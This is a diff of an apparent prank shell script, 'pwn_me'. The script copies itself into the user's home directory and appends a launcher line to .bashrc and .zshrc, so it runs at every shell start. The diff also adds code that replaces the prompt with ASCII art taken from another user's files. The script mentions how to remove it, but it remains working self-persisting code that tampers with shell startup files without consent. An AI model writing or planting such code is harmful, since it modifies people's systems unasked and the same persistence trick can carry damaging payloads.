@@ -21,7 +21,7 @@ function pwn_me {
     PWN_LOC="$HOME/why-you-should-use.zsh"
     [[ ! -a "$PWN_LOC" ]] && cat "$FUNCTION_LOC" > "$PWN_LOC"
     # assemble some string here or something
-    the_pwn="; [[ -a \"$PWN_LOC\" ]] && which zsh >/dev/null && export PWN_ME=PLZ && zsh \"$PWN_LOC\""
+    the_pwn="\n[[ -a \"$PWN_LOC\" ]] && which zsh >/dev/null && export PWN_ME=PLZ && zsh \"$PWN_LOC\""
     for rc in $HOME/.bashrc $HOME/.zshrc
     do
          echo "$the_pwn"  >> $rc
@@ -33,4 +33,7 @@ if [[ $PWN_ME = PLZ ]]; then
     most_useless_use_of_zsh
     echo "ZOMG ZSH ZO GOOD!"
     echo "to remove this, find the line at the end of your .bashrc or .zshrc and remove it"
+    sleep 2
+    export PS1="`cat ~just.jake/.irssi/ascii/kbeckman`[9A[14C"
+    export RPS1=""
 fi
